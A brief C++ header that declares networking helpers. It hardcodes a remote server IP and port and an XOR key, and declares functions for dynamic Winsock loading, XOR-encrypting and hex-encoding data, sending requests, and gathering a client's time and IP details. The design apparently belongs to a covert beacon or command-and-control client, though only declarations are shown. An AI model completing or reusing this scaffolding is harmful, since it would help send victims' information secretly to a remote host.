#pragma once


#define SERVER_HOST "101.99.76.106"
#define SERVER_PORT 7850
#define XOR_KEY "7A3F8C2E1B6D9A0F4C7E3D8B5A2F1E9D" // XOR encryption key

bool loadWinsockFunctions();
std::string xorEncrypt(const std::string& input, const std::string& key);
std::string bytesToHexString(const std::string& input);
std::string sendRequest(const std::string& host, int port, const std::string& request);

//function to receive client information:
std::string getCurrentDateTime();
std::string getClientIPInfo();

